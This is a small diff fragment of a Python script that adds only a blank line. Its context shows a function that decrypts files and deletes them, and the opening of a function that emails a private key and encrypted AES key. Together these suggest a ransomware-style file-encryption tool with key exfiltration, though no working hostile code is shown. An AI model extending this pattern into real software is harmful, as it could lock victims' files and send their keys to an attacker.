@@ -75,6 +75,7 @@ def decrypt_files_in_directory(directory_path, aes_key, aes_iv):
                 df.write(decrypted_data)
             os.remove(file_path)
             print(f"Decrypted and removed: {file_path}")
+            
 # Decrypt the files in the directory and remove the ".aes" extension
 def send_private_key_via_email(private_key, encrypted_aes_key, aes_iv):
     pem_private_key = private_key.private_bytes(
